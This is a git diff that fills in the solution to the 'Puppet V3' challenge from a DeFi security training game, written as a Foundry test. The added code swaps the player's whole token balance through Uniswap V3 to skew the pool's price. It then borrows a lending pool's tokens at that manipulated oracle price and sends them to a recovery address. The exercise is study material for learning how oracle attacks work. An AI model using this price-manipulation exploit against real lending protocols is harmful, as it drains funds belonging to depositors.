@@ -10,6 +10,8 @@ import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {INonfungiblePositionManager} from "../../src/puppet-v3/INonfungiblePositionManager.sol";
 import {PuppetV3Pool} from "../../src/puppet-v3/PuppetV3Pool.sol";
+import {TickMath} from "@uniswap/v3-core/contracts/libraries/TickMath.sol";
+import {ISwapRouter} from "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";
 
 contract PuppetV3Challenge is Test {
     address deployer = makeAddr("deployer");
@@ -119,7 +121,39 @@ contract PuppetV3Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV3() public checkSolvedByPlayer {
-        
+        IUniswapV3Pool uniswapPool = IUniswapV3Pool(uniswapFactory.getPool(address(weth), address(token), FEE));
+        // Use Uniswap V3 periphery router so the callback is handled by the router
+        ISwapRouter router = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
+
+        // Determine direction: we want to push price to make WETH more expensive,
+        // so sell DVT for WETH (add DVT, remove WETH)
+        bool zeroForOne = uniswapPool.token0() == address(token);
+        uint160 sqrtPriceLimitX96 = zeroForOne ? (TickMath.MIN_SQRT_RATIO + 1) : (TickMath.MAX_SQRT_RATIO - 1);
+
+        // Approve router to spend player's DVT
+        token.approve(address(router), type(uint256).max);
+
+        // 1) Swap DVT for WETH
+        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams({
+            tokenIn: address(token),
+            tokenOut: address(weth),
+            fee: FEE,
+            recipient: player,
+            deadline: block.timestamp + 3 days,
+            amountIn: token.balanceOf(player),
+            amountOutMinimum: 0,
+            sqrtPriceLimitX96: sqrtPriceLimitX96
+        });
+
+        uint256 received = router.exactInputSingle(params);
+        console.log(received);
+
+        skip(100);
+
+        // 2) Borrow from lending pool with mainpulated WETH price
+        weth.approve(address(lendingPool), type(uint256).max);
+        lendingPool.borrow(1_000_000e18);
+        token.transfer(recovery, 1_000_000e18);
     }
 
     /**
